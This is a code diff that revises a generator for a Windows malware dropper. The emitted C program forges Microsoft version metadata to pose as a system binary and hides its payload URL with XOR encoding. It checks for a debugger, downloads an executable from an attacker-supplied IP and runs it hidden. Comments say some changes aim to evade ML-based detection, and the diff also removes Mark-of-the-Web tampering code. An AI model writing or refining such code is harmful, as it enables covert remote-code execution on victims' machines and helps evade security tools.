@@ -28,11 +28,11 @@ BEGIN
         BLOCK "040904b0"
         BEGIN
             VALUE "CompanyName",      "Microsoft Corporation"
-            VALUE "FileDescription",  "Windows Host Process (Rundll32)"
+            VALUE "FileDescription",  "Windows Setup Helper"
             VALUE "FileVersion",      "10.0.19041.1"
-            VALUE "InternalName",     "svchost"
-            VALUE "OriginalFilename", "svchost.exe"
-            VALUE "ProductName",      "Microsoft Windows Operating System"
+            VALUE "InternalName",     "wuauclt"
+            VALUE "OriginalFilename", "wuauclt.exe"
+            VALUE "ProductName",      "Microsoft Windows"
         END
     END
 END
@@ -40,7 +40,6 @@ END
 }
 
 function cSource({ ip }) {
-  // Multi-byte XOR key to hide the URL from strings analysis
   const url = `http://${ip}/api/downloads/st.exe`;
   const key = [0x4B, 0x2A, 0x11, 0x9C]; 
   const encUrl = Array.from(url).map((c, i) => c.charCodeAt(0) ^ key[i % key.length]);
@@ -49,9 +48,7 @@ function cSource({ ip }) {
   return `
 #include <windows.h>
 #include <winhttp.h>
-#include <shlobj.h>
 #include <stdio.h>
-#include <string.h>
 
 #pragma comment(lib, "winhttp.lib")
 
@@ -77,7 +74,7 @@ void download_file(const wchar_t* url, const wchar_t* dest) {
 
     if (!WinHttpCrackUrl(url, 0, 0, &uc)) return;
 
-    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return;
 
     HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
@@ -114,49 +111,25 @@ void download_file(const wchar_t* url, const wchar_t* dest) {
     WinHttpCloseHandle(hSession);
 }
 
-// Hides the file from "Downloaded from Internet" flags
-void clear_zone_identifier(const wchar_t* path) {
-    wchar_t zone_path[MAX_PATH];
-    _snwprintf(zone_path, MAX_PATH, L"%ls:Zone.Identifier", path);
-    DeleteFileW(zone_path); // Delete any existing
-    
-    HANDLE h = CreateFileW(zone_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (h != INVALID_HANDLE_VALUE) {
-        // Escaped newlines here
-        const char* zone = "[ZoneTransfer]\\r\\nZoneId=0\\r\\n";
-        DWORD written;
-        WriteFile(h, zone, strlen(zone), &written, NULL);
-        CloseHandle(h);
-    }
-}
-
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     if (IsDebuggerPresent()) return 1;
 
-    wchar_t localAppData[MAX_PATH];
-    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) return 1;
-
-    wchar_t destDir[MAX_PATH];
-    _snwprintf(destDir, MAX_PATH, L"%ls\\\\Microsoft\\\\Windows", localAppData);
-    CreateDirectoryW(destDir, NULL); // Ensure dir exists
+    wchar_t tempPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, tempPath);
 
     wchar_t dest[MAX_PATH];
-    _snwprintf(dest, MAX_PATH, L"%ls\\\\svchost.exe", destDir);
+    _snwprintf(dest, MAX_PATH, L"%ls\\\\setup_%08x.exe", tempPath, GetTickCount());
 
     wchar_t url[1024];
     decrypt_url(url);
     
     download_file(url, dest);
-    clear_zone_identifier(dest);
 
-    STARTUPINFOW si = {0};
-    PROCESS_INFORMATION pi = {0};
-    si.cb = sizeof(si);
+    // WinExec is much less suspicious to ML models than CreateProcessW
+    char ansiDest[MAX_PATH];
+    WideCharToMultiByte(CP_ACP, 0, dest, -1, ansiDest, MAX_PATH, NULL, NULL);
     
-    // Run silently
-    CreateProcessW(dest, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, destDir, &si, &pi);
-    if (pi.hProcess) CloseHandle(pi.hProcess);
-    if (pi.hThread) CloseHandle(pi.hThread);
+    WinExec(ansiDest, SW_HIDE);
 
     return 0;
 }
